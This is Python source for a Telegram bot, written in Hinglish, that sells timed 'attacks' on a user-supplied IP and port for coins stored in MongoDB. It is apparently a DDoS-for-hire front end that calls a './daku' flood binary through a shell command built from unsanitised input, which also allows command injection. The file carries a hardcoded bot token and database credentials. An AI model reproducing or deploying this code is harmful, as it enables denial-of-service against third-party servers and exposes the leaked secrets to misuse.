import asyncio
from datetime import datetime, timedelta
from telegram import Update
from telegram.ext import Application, CommandHandler, CallbackContext
from motor.motor_asyncio import AsyncIOMotorClient

bot_start_time = datetime.now()
attack_in_progress = False
current_attack = None  # Store details of the current attack
attack_history = []  # Store attack logs

TELEGRAM_BOT_TOKEN = '7747879674:AAFBTmfc5UHLAbFSeUAEKxpbiE2CPwya8dI'
ADMIN_USER_ID = 1944182800
MONGO_URI = "mongodb+srv://Kamisama:Kamisama@kamisama.m6kon.mongodb.net/"
DB_NAME = "dake"
COLLECTION_NAME = "users"
attack_in_progress = False
ATTACK_TIME_LIMIT = 240  # Maximum attack duration in seconds
COINS_REQUIRED_PER_ATTACK = 1  # Coins required for an attack

# MongoDB setup
mongo_client = AsyncIOMotorClient(MONGO_URI)
db = mongo_client[DB_NAME]
users_collection = db[COLLECTION_NAME]

async def get_user(user_id):
    """Fetch user data from MongoDB."""
    user = await users_collection.find_one({"user_id": user_id})
    if not user:
        return {"user_id": user_id, "coins": 0}
    return user

async def update_user(user_id, coins):
    """Update user coins in MongoDB."""
    await users_collection.update_one(
        {"user_id": user_id},
        {"$set": {"coins": coins}},
        upsert=True
    )
    
async def daku(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    args = context.args

    if chat_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="*🖕 Chal nikal! Tera aukaat nahi hai yeh command chalane ki. Admin se baat kar pehle.*", parse_mode='Markdown')
        return

    if len(args) != 3:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Tere ko simple command bhi nahi aati? Chal, sikh le: /daku <add|rem> <user_id> <coins>*", parse_mode='Markdown')
        return

    command, target_user_id, coins = args
    coins = int(coins)
    target_user_id = int(target_user_id)

    user = await get_user(target_user_id)

    if command == 'add':
        new_balance = user["coins"] + coins
        await update_user(target_user_id, new_balance)
        await context.bot.send_message(chat_id=chat_id, text=f"*✅ User {target_user_id} ko {coins} coins diye gaye. Balance: {new_balance}.*", parse_mode='Markdown')
    elif command == 'rem':
        new_balance = max(0, user["coins"] - coins)
        await update_user(target_user_id, new_balance)
        await context.bot.send_message(chat_id=chat_id, text=f"*✅ User {target_user_id} ke {coins} coins kaat diye. Balance: {new_balance}.*", parse_mode='Markdown')

from datetime import datetime, timedelta

# Add these global variables
attack_in_progress = False
attack_end_time = None  # Stores the end time of the ongoing attack
bot_start_time = datetime.now()  # Tracks when the bot started

async def attack(update: Update, context: CallbackContext):
    global attack_in_progress, attack_end_time, bot_start_time

    chat_id = update.effective_chat.id
    user_id = update.effective_user.id
    args = context.args

    user = await get_user(user_id)

    if user["coins"] < COINS_REQUIRED_PER_ATTACK:
        await context.bot.send_message(
            chat_id=chat_id,
            text="*💰 Bhai, tere paas toh coins nahi hai! Pehle admin ke paas ja aur coins le aa. 😂*",
            parse_mode='Markdown'
        )
        return

    if attack_in_progress:
        remaining_time = (attack_end_time - datetime.now()).total_seconds()
        await context.bot.send_message(
            chat_id=chat_id,
            text=f"*⚠️ Arre bhai, ruk ja! Ek aur attack chal raha hai. Attack khatam hone mein {int(remaining_time)} seconds bache hain.*",
            parse_mode='Markdown'
        )
        return

    if len(args) != 3:
        await context.bot.send_message(
            chat_id=chat_id,
            text=(
                "*❌ Usage galat hai! Command ka sahi format yeh hai:*\n"
                "*👉 /attack <ip> <port> <duration>*\n"
                "*📌 Example: /attack 192.168.1.1 26547 240*"
            ),
            parse_mode='Markdown'
        )
        return

    ip, port, duration = args
    port = int(port)
    duration = int(duration)

    # Check for restricted ports
    restricted_ports = [17500, 20000, 20001, 20002]
    if port in restricted_ports or (100 <= port <= 999):
        await context.bot.send_message(
            chat_id=chat_id,
            text=(
                "*❌ YE PORT WRONG HAI SAHI PORT DALO AUR NAHI PATA TOH YE VIDEO DEKHO ❌*\n\n"
                "*📺 LINK: https://youtu.be/bBJ9pate5bM?si=CpkKH_FIncGbpXuI*"
            ),
            parse_mode='Markdown'
        )
        return

    if duration > ATTACK_TIME_LIMIT:
        await context.bot.send_message(
            chat_id=chat_id,
            text=(
                f"*⛔ Limit cross mat karo! Tum sirf {ATTACK_TIME_LIMIT} seconds tak attack kar sakte ho.*\n"
                "*Agar zyada duration chahiye toh admin se baat karo! 😎*"
            ),
            parse_mode='Markdown'
        )
        return

    # Deduct coins
    new_balance = user["coins"] - COINS_REQUIRED_PER_ATTACK
    await update_user(user_id, new_balance)

    attack_in_progress = True
    attack_end_time = datetime.now() + timedelta(seconds=duration)
    await context.bot.send_message(
        chat_id=chat_id,
        text=(
            "*🚀 [ATTACK INITIATED] 🚀*\n\n"
            f"*💣 Target IP: {ip}*\n"
            f"*🔢 Port: {port}*\n"
            f"*🕒 Duration: {duration} seconds*\n"
            f"*💰 Coins Deducted: {COINS_REQUIRED_PER_ATTACK}*\n"
            f"*📉 Remaining Balance: {new_balance}*\n\n"
            "*🔥 Attack chal raha hai! Chill kar aur enjoy kar! 💥*"
        ),
        parse_mode='Markdown'
    )

    asyncio.create_task(run_attack(chat_id, ip, port, duration, context))

async def run_attack(chat_id, ip, port, duration, context):
    global attack_in_progress, attack_end_time
    attack_in_progress = True

    try:
        command = f"./daku {ip} {port} {duration} {200} {1000}"
        process = await asyncio.create_subprocess_shell(
            command,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        stdout, stderr = await process.communicate()

        if stdout:
            print(f"[stdout]\n{stdout.decode()}")
        if stderr:
            print(f"[stderr]\n{stderr.decode()}")

    except Exception as e:
        await context.bot.send_message(
            chat_id=chat_id,
            text=f"*⚠️ Error: {str(e)}*\n*Command failed to execute. Contact admin if needed.*",
            parse_mode='Markdown'
        )

    finally:
        attack_in_progress = False
        attack_end_time = None
        await context.bot.send_message(
            chat_id=chat_id,
            text=(
                "*✅ [ATTACK FINISHED] ✅*\n\n"
                f"*💣 Target IP: {ip}*\n"
                f"*🔢 Port: {port}*\n"
                f"*🕒 Duration: {duration} seconds*\n\n"
                "*💥 Attack complete! Ab chill kar aur feedback bhej! 🚀*"
            ),
            parse_mode='Markdown'
        )
    
async def uptime(update: Update, context: CallbackContext):
    elapsed_time = (datetime.now() - bot_start_time).total_seconds()
    minutes, seconds = divmod(int(elapsed_time), 60)
    await context.bot.send_message(update.effective_chat.id, text=f"*⏰Bot uptime:* {minutes} minutes, {seconds} seconds", parse_mode='Markdown')
    
def main():
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
    application.add_handler(CommandHandler("daku", daku))
    application.add_handler(CommandHandler("attack", attack))
    application.add_handler(CommandHandler("uptime", uptime))
    application.run_polling()

if __name__ == '__main__':
    main()